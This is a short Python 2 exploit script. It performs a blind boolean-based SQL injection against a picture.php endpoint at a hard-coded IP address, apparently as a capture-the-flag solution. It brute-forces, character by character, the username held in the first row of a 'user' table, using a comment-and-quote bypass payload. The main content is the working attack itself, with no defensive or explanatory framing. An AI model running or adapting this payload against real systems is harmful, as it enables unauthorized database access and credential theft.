# !/usr/bin/env python
#  -*- coding: utf-8 -*-
import requests
import sys
import urllib

import re


# URL = 'http://60.191.205.80/picture.php?id=/*\'%2b\'"%2b(if((ord(substr((select username from user limit 1),{},1))={}),1,0))%2b"*/'
# c = {'PHPSESSID': '9m70vp2cbogeimcvu03q38k5b4'}


def poc(payload):
    url = 'http://60.191.205.80/picture.php?id=' + urllib.quote(payload, safe='')
    print url
    r = requests.get(url=url, timeout=10)
    if len(r.content) > 10 and 'not found!' not in r.content:
        return True
    return False
    #
    # if 'Something wrong happened' in r.content:
    #     exit('SQL Syntax Error.')
    #
    # r2 = requests.get(url=URL + '/user.php', cookies=c)
    # try:
    #     return re.findall('</h1><p>([\s\S]*?)</p><p>', r2.content)[0]
    # except IndexError:
    #     return 0


def get_admin_pass():
    ans = ''
    for pos in range(1, 30):
        print("checking:", pos)
        for num in range(32, 127):
            base_payload = '/*\'%2b\'"%2b(if(ord(substr((select username from user limit 1),{},1))={},1,0))%2b"*/'.format(
                pos, num)
            if poc(base_payload):
                ans += chr(num)
                print ans
                break


if __name__ == '__main__':
    print poc(sys.argv[1])

    # get_admin_pass()
